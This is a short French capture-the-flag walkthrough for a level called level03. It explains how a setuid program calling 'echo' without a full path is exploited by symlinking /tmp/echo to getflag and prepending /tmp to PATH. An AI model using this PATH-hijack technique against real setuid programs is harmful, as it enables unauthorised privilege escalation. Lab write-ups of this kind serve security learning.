@@ -1,0 +1,18 @@
+avec la commande ls -l :
+le programme level03 a la permission s = fichier exécuté par le propriétaire
+propriétaire = flag03 (qui peut aussi exécuter la commande getflag)
+
+cat level03 :
+on voit "echo Exploit me!"
+
+la commande echo fait partie des fichiers dans les dossiers de la variable d'environement PATH (env)
+
+on crée un autre fichier echo dans un dossier writable auquel on liera la commande getflag :
+- dossier permission w pour tout le monde : /tmp (ls -l)
+- lien vers getflag : which getflag > /bin/getflag
+- création du lien symbolique : ln -s /bin/getflag /tmp/echo
+- ajouter au début (pour qu'il utilise ce path en premier et donc l'echo qu'on a créé) le path du nouvel
+echo dans la variable d'environement PATH : export PATH=/tmp:$PATH
+
+exécuter ./level03
+
